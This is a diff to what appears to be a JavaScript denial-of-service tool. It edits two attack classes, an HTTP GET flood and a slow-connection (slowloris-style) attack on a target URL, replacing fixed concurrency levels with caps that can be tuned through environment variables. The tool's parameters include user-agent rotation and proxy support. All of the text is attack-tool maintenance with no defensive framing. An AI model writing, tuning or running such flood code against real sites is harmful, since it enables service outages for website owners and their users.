@@ -12,7 +12,9 @@ export class HTTPGetFlood {
     constructor(targetUrl, duration, rpc = 1, userAgents = [], referers = [], proxies = null) {
         this.url = new URL(targetUrl);
         this.duration = duration;
-        this.rpc = Math.max(rpc * 20, 100); // 20x multiplier, minimum 100
+		// Safety caps to prevent OOM - tunable via env
+		const MAX_RPC_CAP = parseInt(process.env.MAX_HTTP_RPC || '50', 10);
+		this.rpc = Math.min(Math.max(rpc * 20, 50), MAX_RPC_CAP);
         this.userAgents = userAgents;
         this.referers = referers;
         this.proxies = proxies;
@@ -23,9 +25,10 @@ export class HTTPGetFlood {
         const endTime = Date.now() + (this.duration * 1000);
 
         while (Date.now() < endTime && this.active) {
-            // 50 concurrent attack waves
+			// Tunable concurrent attack waves
+			const MAX_WAVES = parseInt(process.env.MAX_HTTP_WAVES || '10', 10);
             const waves = [];
-            for (let i = 0; i < 50; i++) {
+			for (let i = 0; i < MAX_WAVES; i++) {
                 waves.push(this.attack());
             }
             await Promise.allSettled(waves);
@@ -210,8 +213,9 @@ export class HTTPSlowAttack {
     async start() {
         const endTime = Date.now() + (this.duration * 1000);
 
-        // Create 1000 slow connections
-        for (let i = 0; i < 1000; i++) {
+		// Tunable number of slow connections
+		const MAX_SLOW_CONN = parseInt(process.env.MAX_SLOW_CONNECTIONS || '200', 10);
+		for (let i = 0; i < MAX_SLOW_CONN; i++) {
             if (!this.active) break;
             this.attack();
             await Tools.sleep(5); // Small delay between connections
